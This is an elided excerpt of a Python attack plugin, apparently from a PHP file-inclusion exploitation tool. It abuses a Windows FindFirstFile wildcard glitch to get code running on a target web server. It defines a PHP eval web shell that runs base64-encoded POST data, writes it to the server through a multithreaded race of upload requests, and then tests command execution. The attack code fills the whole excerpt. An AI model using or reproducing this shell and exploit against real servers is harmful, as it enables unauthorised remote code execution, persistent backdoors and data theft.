...
class FindFirstFileAbuse(basePlugin):
    ...
    def plugin_init(self):
        self.display = ''.join(random.choice(
            string.ascii_uppercase + string.digits) for x in range(32))
        self.evalshell = "<?php $var=\"data\"; if (isset($var)){eval(base64_decode($_POST[$var]));} ?>"
        self.payload = "<?php $c=fopen('%s', 'w'); fwrite($c, '%s'); fclose($c); echo '%s' ?>" % (
            self.egg, self.evalshell, self.display)
    ...
    def plugin_fallback_modes_requested(self, langClass):
        ...
        if (langClass.getName() == "PHP"):
            self.lang = langClass
            ret.append(
                ("Launch FindFirstFile Glitch (Windows only)...", "FindFirstFileAbuse.hax"))
    ...
    def plugin_callback_handler(self, callbackstring, haxhelper):
        if (callbackstring == "FindFirstFileAbuse.hax"):
            ...
            while(inp != "q" and inp != "Q"):
                ...
                options.append(
                    "3. Change number of attempts (Current: %d)" % (self.maxAttempts))
                options.append(
                    "4. Change number of threads (Current: %d)" % (self.maxThreads))
                options.append(
                    "5. Change eggdrop location (Current: %s)" % (self.egg))
                options.append(
                    "6. Change your lottery ticket (Current: %s)" % (self.lotteryTicket))
                ...
                try:
                    ...
                    if (idx == 1):
                        self.remotetmpdir = input(
                            "Please type in the complete URL of the Remote Temporary Directory: ")
                        ...
                        tmp = input(
                            "Please type in the number of attempts you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                        ...
                        tmp = input(
                            "Please type in the number of threads you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                        ...
                        self.egg = input(
                            "Please type location where to try to drop the egg.\nPlease no trailing '\\' :")
                        print("EggDrop location changed to: %s" % (self.egg))

                    elif (idx == 6):
                        self.lotteryTicket = input(
                            "Please type in your new lottery ticket: ")
                        ...
                        if (self.remotetmpdir != None and self.remotetmpdir != ""):
                            ...
                            path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(
                            ...
                            if (self.createEgg(haxhelper, path, postdata)):
                                ...
                                if (res.find(answer) != -1):
                                    ...
                                    shellquiz, shellanswer = xmlconfig.generateShellQuiz(
                                        haxhelper.isUnix())
                                    ...
                                    for item in self.lang.getExecMethods():
                                        ...
                                        if (item.isUnix() and haxhelper.isUnix()) or (item.isWindows() and haxhelper.isWindows()):
                                            self._log("Testing execution thru '%s'..." % (
                                                name), self.LOG_INFO)
                                            code = item.generatePayload(
                                                shell_test_code)
                                            code = code.replace("<?php", "")
                                            code = code.replace("?>", "")
                                            testload = urllib.parse.urlencode(
        ...
        while (attempt < self.maxAttempts or len(runningThreads) > 0):
            if (len(runningThreads) < self.maxThreads and attempt < self.maxAttempts):
                ...
                content = content.replace(
                    "__SIZE_OF_FILE__", str(len(self.payload)))
                ...
                newThread = ProbeThread(
                    host, 80, content, haxhelper, self.display)
